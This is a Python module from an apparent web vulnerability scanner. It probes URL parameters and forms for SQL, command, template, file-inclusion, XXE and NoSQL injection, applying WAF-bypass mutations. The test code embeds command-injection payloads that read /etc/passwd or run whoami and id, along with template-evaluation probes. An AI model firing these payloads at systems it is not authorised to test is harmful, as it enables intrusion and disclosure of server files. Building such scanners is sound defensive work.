# scanner/dast/modules/injection.py
#
# AGGRESSIVE INJECTION MODULE — Multi-strategy, multi-encoding, multi-database
# Tests: SQLi (error/union/boolean/time/stacked/NoSQL), CMDI, SSTI, LFI, XXE
# Each test uses WAF bypass mutations and context-aware payload selection.
#
# FIXES vs previous version:
#   1. Standardized thresholds: boolean SQLi 80-byte min diff (was 50),
#      time-based SQLi 4.5s + 30% correlation (was 3.0s flat)
#   2. Added baseline check to XXE detection (was missing, caused FPs)
#   3. Tightened NoSQL detection — only MongoDB-specific error patterns
#   4. Added confidence_tier and fp_likelihood to all findings
#   5. Delegated mutations to PayloadMutator (single source of truth)

import asyncio
import logging
import os
import re
import time
import urllib.parse

from scanner.dast.payloads import (
    SQLI_PAYLOADS, SQLI_ERROR_SIGNATURES,
    CMDI_PAYLOADS, SSTI_PAYLOADS, LFI_PAYLOADS,
    XXE_PAYLOADS, NOSQL_PAYLOADS,
)
from scanner.dast.payload_mutator import PayloadMutator

logger = logging.getLogger(__name__)

_mutator = PayloadMutator()

CMDI_OUTPUT_MARKERS = [
    "root:x:", "root:0:0", "daemon:", "bin/bash", "bin/sh",
    "uid=", "gid=", "groups=", "www-data",
    "Windows IP Configuration", "Microsoft Windows",
    "[boot loader]", "[fonts]", "SENTINEL_CMDI",
]

# Standardized thresholds
BOOLEAN_MIN_DIFF = 80       # bytes — minimum diff between true/false responses
TIME_MIN_DELAY   = 4.5     # seconds — minimum absolute delay for time-based
TIME_CORR_MIN    = 0.70    # minimum correlation (delay must be >= 70% of intended sleep)

# MongoDB-specific error patterns (tightened from generic "syntax error")
NOSQL_MONGO_ERRORS = [
    "mongoerror", "mongod", "mongodb", "mongo",
    "$where", "$gt", "$ne", "$regex", "$expr",
    "BSON", "bson", "errcode",
]


def _classify_confidence(confidence: float) -> tuple:
    """Return (confidence_tier, fp_likelihood) based on confidence score."""
    if confidence >= 0.90:
        return ("high", "unlikely")
    elif confidence >= 0.70:
        return ("medium", "possible")
    else:
        return ("low", "likely")


def _apply_mutations(payload: str) -> list:
    """Generate WAF-bypass variants using the shared PayloadMutator."""
    return _mutator.mutate(payload)


class InjectionModule:
    def __init__(self, scanner):
        self.scanner = scanner

    async def run(self, client, url: str, params: list) -> None:
        for param in params:
            context = await self.scanner._get_context(client, url, param)

            # Register second-order canary
            canary = f"canary_{param}_{os.urandom(3).hex()}"
            self.scanner.canary_map[canary] = {"url": url, "param": param}
            canary_url = self.scanner.param_engine.inject_payload(url, param, canary)
            await self.scanner._req(client, "GET", canary_url)

            await asyncio.gather(
                self.test_sqli(client, url, param, context),
                self.test_cmdi(client, url, param),
                self.test_ssti(client, url, param),
                self.test_lfi(client, url, param),
                self.test_xxe(client, url, param),
                self.test_nosql(client, url, param),
                return_exceptions=True,
            )

    # ── SQL Injection ─────────────────────────────────────────────────────────
    async def test_sqli(self, client, url: str, param: str, context: str) -> None:
        # Baseline response and latency
        t0       = asyncio.get_event_loop().time()
        baseline = await self.scanner._req(client, "GET", url)
        base_lat = asyncio.get_event_loop().time() - t0
        if not baseline:
            return
        baseline_text = baseline.text

        for raw_payload in SQLI_PAYLOADS:
            for payload in _apply_mutations(raw_payload):
                test_url = self.scanner.param_engine.inject_payload(url, param, payload)
                res = await self.scanner._req(client, "GET", test_url)
                if not res:
                    continue

                # A. Error-based
                body = res.text.lower()
                for sig in SQLI_ERROR_SIGNATURES:
                    if sig.lower() in body:
                        tier, fp = _classify_confidence(0.95)
                        self.scanner._add_finding({
                            "type": "SQL Injection", "subtype": "Error-Based",
                            "url": test_url, "parameter": param, "payload": payload,
                            "severity": "Critical", "confidence": 0.95,
                            "confidence_tier": tier, "fp_likelihood": fp,
                            "evidence": f"DB error: '{sig}'",
                            "description": f"Parameter '{param}' reflects a SQL error — unsanitised input reaches the DB.",
                        })
                        return

                # B. Union-based (look for numeric column markers)
                if "UNION" in payload.upper() and "SELECT" in payload.upper():
                    if abs(len(res.text) - len(baseline_text)) > 200:
                        for i in range(1, 10):
                            marker = f"SENTINEL_COL_{i}"
                            if marker in res.text:
                                tier, fp = _classify_confidence(0.93)
                                self.scanner._add_finding({
                                    "type": "SQL Injection", "subtype": "Union-Based",
                                    "url": test_url, "parameter": param, "payload": payload,
                                    "severity": "Critical", "confidence": 0.93,
                                    "confidence_tier": tier, "fp_likelihood": fp,
                                    "evidence": f"UNION SELECT returned data — column {i} visible",
                                    "description": f"Parameter '{param}' allows UNION-based data extraction.",
                                })
                                return

                # C. Boolean-based blind — FIX: raised threshold from 50 to 80 bytes
                if "1=1" in raw_payload or "' OR '" in raw_payload:
                    f_payload = raw_payload.replace("1=1", "1=2").replace("' OR '", "' AND '")
                    f_url = self.scanner.param_engine.inject_payload(url, param, f_payload)
                    f_res = await self.scanner._req(client, "GET", f_url)
                    if f_res:
                        diff = abs(len(res.text) - len(f_res.text))
                        if diff > BOOLEAN_MIN_DIFF:
                            conf = 0.82
                            tier, fp = _classify_confidence(conf)
                            self.scanner._add_finding({
                                "type": "SQL Injection", "subtype": "Boolean-Based Blind",
                                "url": test_url, "parameter": param, "payload": payload,
                                "severity": "Critical", "confidence": conf,
                                "confidence_tier": tier, "fp_likelihood": fp,
                                "evidence": f"True/false response diff: {diff} bytes",
                                "description": f"Parameter '{param}' behaves differently for true/false SQL conditions.",
                            })
                            return

                # D. Time-based blind — FIX: 4.5s minimum + 30% correlation window
                if any(k in payload.upper() for k in ("SLEEP", "WAITFOR", "BENCHMARK", "PG_SLEEP", "DBMS_PIPE")):
                    t_start = asyncio.get_event_loop().time()
                    await self.scanner._req(client, "GET", test_url, timeout=15)
                    elapsed = asyncio.get_event_loop().time() - t_start
                    delay = elapsed - base_lat
                    # Extract intended sleep time from payload
                    sleep_match = re.search(r'(?:SLEEP|pg_sleep)\s*\(\s*(\d+)', payload, re.IGNORECASE)
                    intended = int(sleep_match.group(1)) if sleep_match else 6
                    correlation = delay / intended if intended > 0 else 0

                    if delay >= TIME_MIN_DELAY and correlation >= TIME_CORR_MIN:
                        conf = 0.87
                        tier, fp = _classify_confidence(conf)
                        self.scanner._add_finding({
                            "type": "SQL Injection", "subtype": "Time-Based Blind",
                            "url": test_url, "parameter": param, "payload": payload,
                            "severity": "Critical", "confidence": conf,
                            "confidence_tier": tier, "fp_likelihood": fp,
                            "evidence": f"Baseline={base_lat:.2f}s  Attack={elapsed:.2f}s  Correlation={correlation:.0%}",
                            "description": f"Parameter '{param}' caused a {elapsed:.2f}s delay — time-based blind SQLi.",
                        })
                        return

    # ── Command Injection ─────────────────────────────────────────────────────
    async def test_cmdi(self, client, url: str, param: str) -> None:
        # Get baseline for CMDI false positive reduction
        baseline = await self.scanner._req(client, "GET", url)
        baseline_text = baseline.text if baseline else ""

        # Output-based (highest confidence)
        output_payloads = [
            ("; cat /etc/passwd", CMDI_OUTPUT_MARKERS),
            ("| cat /etc/passwd", CMDI_OUTPUT_MARKERS),
            ("$(cat /etc/passwd)", CMDI_OUTPUT_MARKERS),
            ("`cat /etc/passwd`", CMDI_OUTPUT_MARKERS),
            ("; whoami", ["root", "www-data", "apache", "nginx", "nobody", "daemon"]),
            ("| whoami", ["root", "www-data", "apache", "nginx", "nobody", "daemon"]),
            ("| id", ["uid=", "gid=", "groups="]),
            ("; id", ["uid=", "gid=", "groups="]),
            ("& dir", ["Volume Serial", "Directory of"]),
            ("| dir", ["Volume Serial", "Directory of"]),
        ]
        for payload, markers in output_payloads:
            for mutated in _apply_mutations(payload)[:3]:
                test_url = self.scanner.param_engine.inject_payload(url, param, mutated)
                res = await self.scanner._req(client, "GET", test_url)
                if res:
                    for m in markers:
                        # Baseline check: skip if marker already in baseline
                        if m in res.text and (not baseline_text or m not in baseline_text):
                            tier, fp = _classify_confidence(0.97)
                            self.scanner._add_finding({
                                "type": "Command Injection", "subtype": "Output-Based",
                                "url": test_url, "parameter": param, "payload": mutated,
                                "severity": "Critical", "confidence": 0.97,
                                "confidence_tier": tier, "fp_likelihood": fp,
                                "evidence": f"OS output marker: '{m}'",
                                "description": f"Parameter '{param}' executes arbitrary OS commands.",
                            })
                            return

        # Time-based blind fallback
        t0       = asyncio.get_event_loop().time()
        base_res = await self.scanner._req(client, "GET", url)
        base_lat = asyncio.get_event_loop().time() - t0

        for payload in ["; sleep 6; #", "| sleep 6", "$(sleep 6)", "`sleep 6`"]:
            for mutated in _apply_mutations(payload)[:2]:
                test_url = self.scanner.param_engine.inject_payload(url, param, mutated)
                t_start  = asyncio.get_event_loop().time()
                await self.scanner._req(client, "GET", test_url, timeout=20)
                elapsed  = asyncio.get_event_loop().time() - t_start
                if elapsed >= base_lat + TIME_MIN_DELAY:
                    conf = 0.85
                    tier, fp = _classify_confidence(conf)
                    self.scanner._add_finding({
                        "type": "Command Injection", "subtype": "Time-Based Blind",
                        "url": test_url, "parameter": param, "payload": mutated,
                        "severity": "Critical", "confidence": conf,
                        "confidence_tier": tier, "fp_likelihood": fp,
                        "evidence": f"Baseline={base_lat:.2f}s  Attack={elapsed:.2f}s",
                        "description": f"Parameter '{param}' caused a {elapsed:.2f}s delay — blind CMDI.",
                    })
                    return

    # ── SSTI ──────────────────────────────────────────────────────────────────
    async def test_ssti(self, client, url: str, param: str) -> None:
        # Phase 1: Quick detection with {{7*7}}
        url1 = self.scanner.param_engine.inject_payload(url, param, "{{7*7}}")
        r1   = await self.scanner._req(client, "GET", url1)
        if not (r1 and "49" in r1.text):
            for payload in ["${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}"]:
                test_url = self.scanner.param_engine.inject_payload(url, param, payload)
                res = await self.scanner._req(client, "GET", test_url)
                if res and "49" in res.text:
                    tier, fp = _classify_confidence(0.90)
                    self.scanner._add_finding({
                        "type": "Server-Side Template Injection (SSTI)", "subtype": "Confirmed",
                        "url": test_url, "parameter": param, "payload": payload,
                        "severity": "Critical", "confidence": 0.90,
                        "confidence_tier": tier, "fp_likelihood": fp,
                        "evidence": f"{payload} evaluated to 49",
                        "description": f"Parameter '{param}' evaluates template expressions — RCE likely.",
                    })
                    return
            return

        # Phase 2: Confirm with different oracle
        url2 = self.scanner.param_engine.inject_payload(url, param, "{{3*3}}")
        r2   = await self.scanner._req(client, "GET", url2)
        if r2 and "9" in r2.text:
            tier, fp = _classify_confidence(0.95)
            self.scanner._add_finding({
                "type": "Server-Side Template Injection (SSTI)", "subtype": "Confirmed",
                "url": url1, "parameter": param, "payload": "{{7*7}}",
                "severity": "Critical", "confidence": 0.95,
                "confidence_tier": tier, "fp_likelihood": fp,
                "evidence": "{{7*7}}->49 and {{3*3}}->9 confirmed",
                "description": f"Parameter '{param}' evaluates template expressions — RCE likely.",
            })

    # ── LFI ───────────────────────────────────────────────────────────────────
    async def test_lfi(self, client, url: str, param: str) -> None:
        LFI_INDICATORS = [
            "root:x:", "root:0:0", "daemon:", "nobody:", "bin/bash",
            "www-data", "[boot loader]", "[fonts]",
            "PHP Version", "phpinfo()",
        ]
        baseline = await self.scanner._req(client, "GET", url)
        baseline_text = baseline.text if baseline else ""

        for payload in LFI_PAYLOADS:
            for mutated in _apply_mutations(payload)[:3]:
                test_url = self.scanner.param_engine.inject_payload(url, param, mutated)
                res = await self.scanner._req(client, "GET", test_url)
                if res:
                    for ind in LFI_INDICATORS:
                        if ind in res.text and (not baseline_text or ind not in baseline_text):
                            tier, fp = _classify_confidence(0.95)
                            self.scanner._add_finding({
                                "type": "Local File Inclusion (LFI)", "subtype": "Path Traversal",
                                "url": test_url, "parameter": param, "payload": mutated,
                                "severity": "Critical", "confidence": 0.95,
                                "confidence_tier": tier, "fp_likelihood": fp,
                                "evidence": f"File marker '{ind}' in response",
                                "description": f"Parameter '{param}' allows reading server files.",
                            })
                            return

    # ── XXE ───────────────────────────────────────────────────────────────────
    async def test_xxe(self, client, url: str, param: str) -> None:
        XXE_INDICATORS = [
            "root:x:", "root:0:0", "daemon:", "[boot loader]",
            "ami-id", "instance-id", "local-ipv4",
        ]
        # FIX: Get baseline to avoid false positives from indicators already
        # present in the page before injection
        baseline = await self.scanner._req(client, "GET", url)
        baseline_text = baseline.text if baseline else ""

        for payload in XXE_PAYLOADS[:5]:
            test_url = self.scanner.param_engine.inject_payload(url, param, payload)
            res = await self.scanner._req(client, "GET", test_url)
            if res:
                for ind in XXE_INDICATORS:
                    if ind in res.text and (not baseline_text or ind not in baseline_text):
                        tier, fp = _classify_confidence(0.95)
                        self.scanner._add_finding({
                            "type": "XML External Entity (XXE)", "subtype": "File Disclosure",
                            "url": test_url, "parameter": param, "payload": payload[:80],
                            "severity": "Critical", "confidence": 0.95,
                            "confidence_tier": tier, "fp_likelihood": fp,
                            "evidence": f"XXE indicator '{ind}' in response (not in baseline)",
                            "description": f"Parameter '{param}' processes XML external entities.",
                        })
                        return

    # ── NoSQL Injection ──────────────────────────────────────────────────────
    async def test_nosql(self, client, url: str, param: str) -> None:
        # Get baseline for NoSQL false positive reduction
        baseline = await self.scanner._req(client, "GET", url)
        baseline_text = baseline.text.lower() if baseline else ""

        for payload in NOSQL_PAYLOADS:
            test_url = self.scanner.param_engine.inject_payload(url, param, payload)
            res = await self.scanner._req(client, "GET", test_url)
            if not res:
                continue
            body_lower = res.text.lower()
            for err in NOSQL_MONGO_ERRORS:
                if err in body_lower and (not baseline_text or err not in baseline_text):
                    # Higher confidence for MongoDB-specific errors
                    if err in ("mongoerror", "mongod", "mongodb", "bson"):
                        conf = 0.92
                    elif err in ("$where", "$gt", "$ne", "$regex", "$expr"):
                        conf = 0.80
                    else:
                        conf = 0.70
                    tier, fp = _classify_confidence(conf)
                    self.scanner._add_finding({
                        "type": "NoSQL Injection", "subtype": "Operator Injection",
                        "url": test_url, "parameter": param, "payload": payload[:60],
                        "severity": "Critical", "confidence": conf,
                        "confidence_tier": tier, "fp_likelihood": fp,
                        "evidence": f"NoSQL indicator: '{err}'",
                        "description": f"Parameter '{param}' may allow NoSQL operator injection.",
                    })
                    return

    # ── Form injection ─────────────────────────────────────────────────────────
    async def test_form(self, client, form: dict) -> None:
        url    = form["url"]
        method = form["method"]
        base   = dict(form["inputs"])

        def _send(data):
            if method == "POST":
                return self.scanner._req(client, "POST", url, data=data, timeout=12)
            return self.scanner._req(client, "GET", url, params=data, timeout=12)

        # SQLi via form
        for payload in SQLI_PAYLOADS[:15]:
            for mutated in _apply_mutations(payload)[:2]:
                data = {k: mutated for k in base}
                res  = await _send(data)
                if not res:
                    continue
                body = res.text.lower()
                for sig in SQLI_ERROR_SIGNATURES:
                    if sig.lower() in body:
                        tier, fp = _classify_confidence(0.95)
                        self.scanner._add_finding({
                            "type": "SQL Injection", "subtype": f"Error-Based via Form ({method})",
                            "url": url, "parameter": "form", "payload": mutated,
                            "severity": "Critical", "confidence": 0.95,
                            "confidence_tier": tier, "fp_likelihood": fp,
                            "evidence": f"DB error: '{sig}'",
                            "description": f"Form at {url} passes unsanitised input to the DB.",
                        })
                        return

        # NoSQL via form — tightened to MongoDB-specific patterns
        for payload in NOSQL_PAYLOADS[:4]:
            data = {k: payload for k in base}
            res = await _send(data)
            if res:
                for err in NOSQL_MONGO_ERRORS:
                    if err in res.text.lower():
                        tier, fp = _classify_confidence(0.80)
                        self.scanner._add_finding({
                            "type": "NoSQL Injection", "subtype": f"Form ({method})",
                            "url": url, "parameter": "form", "payload": payload[:60],
                            "severity": "Critical", "confidence": 0.80,
                            "confidence_tier": tier, "fp_likelihood": fp,
                            "evidence": f"NoSQL indicator: '{err}'",
                            "description": f"Form at {url} may allow NoSQL injection.",
                        })
                        return
